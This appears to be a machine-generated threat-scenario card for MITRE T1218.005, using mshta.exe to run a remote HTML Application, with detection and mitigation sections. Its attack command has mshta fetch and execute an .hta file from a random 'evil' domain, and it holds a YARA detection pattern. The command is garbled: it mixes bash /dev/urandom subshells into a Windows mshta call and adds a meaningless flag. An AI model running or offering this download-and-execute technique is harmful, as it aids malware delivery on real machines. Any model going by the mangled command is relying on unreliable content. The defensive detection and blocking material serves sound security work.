---
type: campaign
scenario_id: 306
tactic: Defense Evasion
technique: "T1218.005: Mshta"
technique_id: T1218.005
tags: [campaign, lotl, defense_evasion]
---

# Using mshta.exe to execute malicious HTML Application remotely.

## Threat Description
Using mshta.exe to execute malicious HTML Application remotely.

## Attack Command
```
mshta http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).hta) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor mshta remote: `wmic process where name='mshta.exe' get commandline | findstr http`; YARA rule: `rule MshtaRemoteHta { strings: $a = /mshta.*http.*hta/ nocase; condition: $a }`.

## Mitigation
Restrict mshta: `icacls %windir%\System32\mshta.exe /deny Everyone:RX`; Block HTA downloads: `netsh advfirewall firewall add rule name='Block mshta' dir=out program='%windir%\System32\mshta.exe' action=block`.

## AI Training Prompt
Train AI to detect mshta remote HTA execution and suggest firewall rules.

## References
- MITRE ATT&CK T1218.005: https://attack.mitre.org/techniques/T1218/005/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
